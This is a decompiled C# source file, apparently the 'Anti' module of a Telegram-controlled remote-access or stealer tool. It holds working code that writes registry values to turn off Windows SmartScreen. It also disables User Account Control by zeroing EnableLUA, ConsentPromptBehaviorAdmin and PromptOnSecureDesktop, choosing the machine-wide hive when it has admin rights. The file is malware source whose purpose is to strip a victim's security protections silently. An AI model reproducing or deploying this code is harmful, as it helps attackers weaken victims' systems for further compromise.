using System;
using Microsoft.Win32;
using TelegramBot.Main;

namespace TelegramBot.Anti
{
	// Token: 0x02000102 RID: 258
	internal class DisableNotifications
	{
		// Token: 0x0600036E RID: 878 RVA: 0x00027544 File Offset: 0x00025744
		public static bool SmartScreen(int nStatus = 0)
		{
			bool result;
			try
			{
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(DisableNotifications.registryHive, DisableNotifications.registryView))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer", Environment.Is64BitOperatingSystem))
					{
						if (registryKey2 != null)
						{
							registryKey2.SetValue("SmartScreenEnabled", "Off", RegistryValueKind.String);
						}
						using (RegistryKey registryKey3 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", Environment.Is64BitOperatingSystem))
						{
							if (registryKey3 != null)
							{
								registryKey3.SetValue("EnableSmartScreen", nStatus, RegistryValueKind.DWord);
							}
						}
						result = true;
					}
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600036F RID: 879 RVA: 0x0002760C File Offset: 0x0002580C
		public static bool UAC(int Status = 0)
		{
			bool result;
			try
			{
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(DisableNotifications.registryHive, DisableNotifications.registryView))
				{
					using (RegistryKey registryKey2 = (registryKey != null) ? registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", Environment.Is64BitOperatingSystem) : null)
					{
						if (registryKey2 != null)
						{
							registryKey2.SetValue("EnableLUA", Status, RegistryValueKind.DWord);
						}
						if (registryKey2 != null)
						{
							registryKey2.SetValue("ConsentPromptBehaviorAdmin", Status, RegistryValueKind.DWord);
						}
						if (registryKey2 != null)
						{
							registryKey2.SetValue("PromptOnSecureDesktop", Status, RegistryValueKind.DWord);
						}
					}
					result = true;
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0400058F RID: 1423
		private static readonly RegistryHive registryHive = Check.Acess ? RegistryHive.LocalMachine : RegistryHive.CurrentUser;

		// Token: 0x04000590 RID: 1424
		private static readonly RegistryView registryView = Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32;
	}
}
